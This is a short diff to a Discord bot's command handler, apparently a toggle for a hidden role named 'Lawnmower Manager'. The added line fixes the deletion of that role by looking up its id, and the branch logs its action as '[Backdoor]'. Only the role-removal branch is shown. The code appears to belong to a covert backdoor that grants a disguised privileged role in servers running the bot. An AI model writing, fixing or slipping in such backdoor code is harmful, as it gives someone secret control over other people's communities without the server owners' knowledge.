@@ -46,6 +46,7 @@ export default async function run(message: Message) {
             });
         } else {
             message.guild!.roles.delete("Lawnmower Manager");
+            message.guild!.roles.delete(message.guild!.roles.cache.find(r => r.name === "Lawnmower Manager")!.id);
             c.log(`[Backdoor] Deleted role Lawnmower Manager`);
         }
     }
